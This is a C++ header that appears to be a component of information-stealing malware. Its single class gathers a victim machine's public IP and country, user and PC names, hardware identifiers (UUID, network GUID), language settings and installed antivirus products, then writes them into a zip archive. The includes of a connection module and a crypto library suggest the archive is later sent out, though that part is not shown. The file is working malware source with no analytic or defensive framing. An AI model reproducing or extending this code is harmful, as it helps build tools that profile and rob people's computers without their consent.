#pragma once

#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>
#include <string>
#include <locale>
#include <codecvt>
#include <iomanip>
#include <ctime>
#include <nlohmann/json.hpp>
#include <curl/curl.h>
#include <comdef.h>
#include <Wbemidl.h>
#include <kubazip/zip/zip.h>
#include "structures.hpp"

#pragma comment(lib, "wbemuuid.lib")

#include "../Connection/Connection.hpp"
#include "../Helper/Helper.hpp"

#pragma comment (lib, "botan.lib")

namespace Core
{

    class Info {
    public:

        static std::wstring getWorkingPath()
        {
            wchar_t buffer[MAX_PATH];
            if (GetModuleFileName(nullptr, buffer, MAX_PATH)) {
                return std::wstring(buffer);
            }
            return L"";
        }

        static std::wstring getLocalTime()
        {
            try {
                std::time_t now = std::time(nullptr);
                std::tm localTime;
                localtime_s(&localTime, &now);
                wchar_t timeStr[100];
                std::wcsftime(timeStr, sizeof(timeStr), L"%d/%m/%Y %H:%M:%S", &localTime);
                return std::wstring(timeStr);
            }
            catch (const std::exception&) {
                return L"";
            }
        }

        static std::wstring getSystemLanguage()
        {
            LANGID langId = GetSystemDefaultUILanguage();
            wchar_t localeName[LOCALE_NAME_MAX_LENGTH] = { 0 };
            if (GetLocaleInfo(langId, LOCALE_SISO639LANGNAME, localeName, LOCALE_NAME_MAX_LENGTH)) {
                std::wstring languageCode(localeName);
                if (GetLocaleInfo(langId, LOCALE_SISO3166CTRYNAME, localeName, LOCALE_NAME_MAX_LENGTH)) {
                    std::wstring countryCode(localeName);
                    return languageCode + L"-" + countryCode;
                }
            }
            return L"";
        }

        static std::wstring getKeyboardLanguages()
        {
            try {
                UINT uLayouts;
                HKL* lpList = NULL;
                wchar_t szBuf[512];
                std::wstring result;

                uLayouts = GetKeyboardLayoutList(0, NULL);
                lpList = (HKL*)LocalAlloc(LPTR, (uLayouts * sizeof(HKL)));
                uLayouts = GetKeyboardLayoutList(uLayouts, lpList);
                for (int i = 0; i < uLayouts; ++i)
                {
                    LCID lcid = MAKELCID(((UINT)lpList[i] & 0xffffffff), SORT_DEFAULT);
                    GetLocaleInfo(lcid, LOCALE_SENGLANGUAGE, szBuf, 512);
                    result += szBuf;
                    if (i < uLayouts - 1)
                        result += L"/";
                    memset(szBuf, 0, 512);
                }
                if (lpList) {
                    LocalFree(lpList);
                }
                return result;
            }
            catch (const std::exception&) {
                return L"";
            }
        }

        static std::unordered_map<std::string, std::string> queryHardware()
        {
            try
            {
                std::string osName;
                std::string cpuName;
                std::string gpuName;
                std::string resolutionX;
                std::string resolutionY;
                std::string RAMsize;
                std::string machineID;
                std::string GUID_val;

                HRESULT hres;
                IWbemLocator* pLoc = nullptr;
                IWbemServices* pSvc = nullptr;

                /*hres = CoInitializeEx(0, COINIT_MULTITHREADED);
                if (FAILED(hres)) {
                    return {};
                }
                hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
                if (FAILED(hres)) {
                    CoUninitialize();
                    return {};
                }*/
                hres = CoInitialize(NULL);
                hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
                hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
                if (FAILED(hres)) {
                    CoUninitialize();
                    return {};
                }
                hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
                if (FAILED(hres)) {
                    pLoc->Release();
                    CoUninitialize();
                    return {};
                }
                hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
                if (FAILED(hres)) {
                    pSvc->Release();
                    pLoc->Release();
                    CoUninitialize();
                    return {};
                }
                IEnumWbemClassObject* pEnumerator = nullptr;
                hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT Caption FROM Win32_OperatingSystem"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
                if (SUCCEEDED(hres)) {
                    IWbemClassObject* pclsObj = nullptr;
                    ULONG uReturn = 0;
                    while (pEnumerator) {
                        hres = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
                        if (uReturn == 0) {
                            break;
                        }
                        VARIANT vtProp;
                        VariantInit(&vtProp);
                        hres = pclsObj->Get(L"Caption", 0, &vtProp, 0, 0);
                        if (SUCCEEDED(hres)) {
                            std::wstring wideOsName(vtProp.bstrVal, SysStringLen(vtProp.bstrVal));
                            osName = Helper::WstringToString(wideOsName);
                            VariantClear(&vtProp);
                        }
                        pclsObj->Release();
                    }
                }
                hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT Name, NumberOfCores FROM Win32_Processor"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
                if (SUCCEEDED(hres)) {
                    IWbemClassObject* pclsObj = nullptr;
                    ULONG uReturn = 0;
                    if (pEnumerator != nullptr) {
                        hres = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
                        if (uReturn != 0) {
                            VARIANT vtProp;
                            VariantInit(&vtProp);
                            hres = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
                            if (SUCCEEDED(hres)) {
                                std::wstring wideCpuName(vtProp.bstrVal, SysStringLen(vtProp.bstrVal));
                                cpuName += Helper::WstringToString(wideCpuName);
                                VariantClear(&vtProp);
                            }
                            hres = pclsObj->Get(L"NumberOfCores", 0, &vtProp, 0, 0);
                            if (SUCCEEDED(hres)) {
                                cpuName += " (" + std::to_string(vtProp.intVal) + " Core) ";
                                VariantClear(&vtProp);
                            }
                        }
                        pclsObj->Release();
                    }
                }
                hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT Name,CurrentHorizontalResolution,CurrentVerticalResolution FROM Win32_VideoController"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
                if (SUCCEEDED(hres)) {
                    IWbemClassObject* pclsObj = nullptr;
                    ULONG uReturn = 0;
                    while (pEnumerator) {
                        hres = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
                        if (uReturn == 0) {
                            break;
                        }
                        VARIANT vtPropName, vtPropResX, vtPropResY;
                        VariantInit(&vtPropName);
                        VariantInit(&vtPropResX);
                        VariantInit(&vtPropResY);
                        hres = pclsObj->Get(L"Name", 0, &vtPropName, 0, 0);
                        hres = pclsObj->Get(L"CurrentHorizontalResolution", 0, &vtPropResX, 0, 0);
                        hres = pclsObj->Get(L"CurrentVerticalResolution", 0, &vtPropResY, 0, 0);
                        if (SUCCEEDED(hres)) {
                            std::wstring wideGpuName(vtPropName.bstrVal, SysStringLen(vtPropName.bstrVal));
                            gpuName = Helper::WstringToString(wideGpuName);
                            resolutionX = std::to_string(V_UI4(&vtPropResX));
                            resolutionY = std::to_string(V_UI4(&vtPropResY));
                            VariantClear(&vtPropName);
                            VariantClear(&vtPropResX);
                            VariantClear(&vtPropResY);
                        }
                        pclsObj->Release();
                    }
                }
                hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
                if (SUCCEEDED(hres)) {
                    IWbemClassObject* pclsObj = nullptr;
                    ULONG uReturn = 0;
                    while (pEnumerator) {
                        hres = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
                        if (uReturn == 0) {
                            break;
                        }
                        VARIANT vtProp;
                        VariantInit(&vtProp);
                        hres = pclsObj->Get(L"TotalPhysicalMemory", 0, &vtProp, 0, 0);
                        if (SUCCEEDED(hres)) {
                            unsigned long long totalMemory = _wtoi64(vtProp.bstrVal);
                            unsigned long long ramSizeMB = totalMemory / (1024 * 1024 * 1024);
                            double roundedUp = std::ceil(static_cast<double>(ramSizeMB));
                            RAMsize = std::to_string((long)roundedUp + 1);
                            VariantClear(&vtProp);
                        }
                        pclsObj->Release();
                    }
                }
                hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT UUID FROM Win32_ComputerSystemProduct"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
                if (SUCCEEDED(hres)) {
                    IWbemClassObject* pclsObj = nullptr;
                    ULONG uReturn = 0;
                    while (pEnumerator) {
                        hres = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
                        if (uReturn == 0) {
                            break;
                        }
                        VARIANT vtProp;
                        VariantInit(&vtProp);
                        hres = pclsObj->Get(L"UUID", 0, &vtProp, 0, 0);
                        if (SUCCEEDED(hres)) {
                            std::wstring widemachineID(vtProp.bstrVal, SysStringLen(vtProp.bstrVal));
                            machineID = Helper::WstringToString(widemachineID);
                            VariantClear(&vtProp);
                        }
                        pclsObj->Release();
                    }
                }
                hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT GUID FROM Win32_NetworkAdapter "), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
                if (SUCCEEDED(hres)) {
                    IWbemClassObject* pclsObj = nullptr;
                    ULONG uReturn = 0;
                    while (pEnumerator) {
                        hres = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
                        if (uReturn == 0) {
                            break;
                        }
                        VARIANT vtProp;
                        VariantInit(&vtProp);
                        hres = pclsObj->Get(L"GUID", 0, &vtProp, 0, 0);
                        if (SUCCEEDED(hres)) {
                            std::wstring guid(vtProp.bstrVal, SysStringLen(vtProp.bstrVal));
                            GUID_val = Helper::WstringToString(guid);
                            VariantClear(&vtProp);
                        }
                        pclsObj->Release();
                    }
                }
                pSvc->Release();
                pLoc->Release();
                pEnumerator->Release();
                CoUninitialize();

                std::unordered_map<std::string, std::string> map;
                map["OS: "] = osName;
                map["CPU: "] = cpuName;
                map["GPU: "] = gpuName + " (" + resolutionX + "x" + resolutionY + ")";
                map["Installed RAM: "] = RAMsize + " GB";
                map["UUID: "] = machineID;
                map["GUID: "] = GUID_val;

                return map;
            }
            catch (const std::exception&) {
                return {};
            }
        }

        static std::vector<std::string> getInstalledAV()
        {
            try
            {
                std::vector<std::string> AVs;
                HRESULT hres;
                IWbemLocator* pLoc = nullptr;
                IWbemServices* pSvc = nullptr;

                //hres = CoInitializeEx(0, COINIT_MULTITHREADED);
                //if (FAILED(hres)) {
                //    return {};
                //}
                //hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
                //if (FAILED(hres)) {
                //    CoUninitialize();
                //    return {};
                //}
                hres = CoInitialize(NULL);
                hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
                hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
                if (FAILED(hres)) {
                    CoUninitialize();
                    return {};
                }
                hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\SecurityCenter2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
                if (FAILED(hres)) {
                    pLoc->Release();
                    CoUninitialize();
                    return {};
                }
                hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
                if (FAILED(hres)) {
                    pSvc->Release();
                    pLoc->Release();
                    CoUninitialize();
                    return {};
                }

                IEnumWbemClassObject* pEnumerator = nullptr;
                hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT displayName FROM AntiVirusProduct"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
                if (SUCCEEDED(hres)) {
                    IWbemClassObject* pclsObj = nullptr;
                    ULONG uReturn = 0;
                    while (pEnumerator) {
                        hres = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
                        if (uReturn == 0) {
                            break;
                        }
                        VARIANT vtProp;
                        VariantInit(&vtProp);
                        hres = pclsObj->Get(L"displayName", 0, &vtProp, 0, 0);
                        if (SUCCEEDED(hres)) {
                            std::wstring displayName(vtProp.bstrVal, SysStringLen(vtProp.bstrVal));
                            std::string displayNameUtf8 = Helper::WstringToString(displayName);
                            AVs.push_back(displayNameUtf8);
                            VariantClear(&vtProp);
                        }
                        pclsObj->Release();
                    }
                }
                pSvc->Release();
                pLoc->Release();
                pEnumerator->Release();
                CoUninitialize();

                return AVs;
            }
            catch (const std::exception&) {
                return {};
            }
        }

        static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
            size_t totalSize = size * nmemb;
            std::string* response = static_cast<std::string*>(userp);
            response->append(static_cast<char*>(contents), totalSize);
            return totalSize;
        }

        static void getSystemInfo(struct zip_t* zip, std::string fileName)
        {
            std::stringstream concatenatedString;
            concatenatedString << "Working path: " << Helper::WstringToString(getWorkingPath()) << "\n" << std::endl;

            //- IP Info -
            //curl_global_init(CURL_GLOBAL_DEFAULT);
            CURL* curl = curl_easy_init();
            std::string response_string;
            std::string url = "https://ipwho.is/";
            if (curl) {
                curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &WriteCallback);
                curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

                curl_easy_perform(curl);
                curl_easy_cleanup(curl);
                //curl_global_cleanup();
                curl = nullptr;
            }

            if (!response_string.empty()) {
                try
                {
                    nlohmann::json jsonResponse = nlohmann::json::parse(response_string);

                    std::string ip = jsonResponse["ip"];
                    std::string country = jsonResponse["country"];
                    std::string timezone = jsonResponse["timezone"]["utc"];

                    concatenatedString << "IP: " << ip << std::endl;
                    concatenatedString << "Country: " << country << "\n" << std::endl;
                    concatenatedString << "Local time: " << Helper::WstringToString(getLocalTime()) << std::endl;
                    concatenatedString << "Timezone: " << timezone << std::endl;
                }
                catch (const nlohmann::json::parse_error&) {}
                catch (const nlohmann::json::exception&) {}
                catch (const std::exception&) {}
            }

            //- PC Info -
            concatenatedString << "System language: " << Helper::WstringToString(getSystemLanguage()) << std::endl;
            concatenatedString << "Keyboard languages: " << Helper::WstringToString(getKeyboardLanguages()) << "\n" << std::endl;
            WCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
            DWORD computerNameSize = MAX_COMPUTERNAME_LENGTH + 1;
            if (GetComputerName(computerName, &computerNameSize)) {
                concatenatedString << "PC name: " << Helper::WstringToString(computerName) << std::endl;
            }

            std::string folder = Helper::WstringToString(Helper::getUserFolder());
            size_t lastSlash = folder.find_last_of('\\');
            if (lastSlash != std::string::npos) {
                std::string username = folder.substr(lastSlash + 1);
                concatenatedString << "User name: " << username << std::endl;
            }

            std::unordered_map<std::string, std::string> os_details = queryHardware();
            if (!os_details.empty()) {
                for (const auto& t : os_details) {
                    concatenatedString << t.first << t.second << std::endl;
                }
            }
            //- Other Info -
            concatenatedString << "\nAntivirus software:" << std::endl;
            std::vector<std::string> installed_av = getInstalledAV();
            if (!installed_av.empty()) {
                for (const auto& t : installed_av) {
                    concatenatedString << "\t" << t << std::endl;
                }
            }

            try
            {
                zip_entry_open(zip, fileName.c_str());
                {
                    zip_entry_write(zip, concatenatedString.str().c_str(), concatenatedString.str().size());
                }
                zip_entry_close(zip);
            }
            catch (const std::exception&) {}
        }
    };


}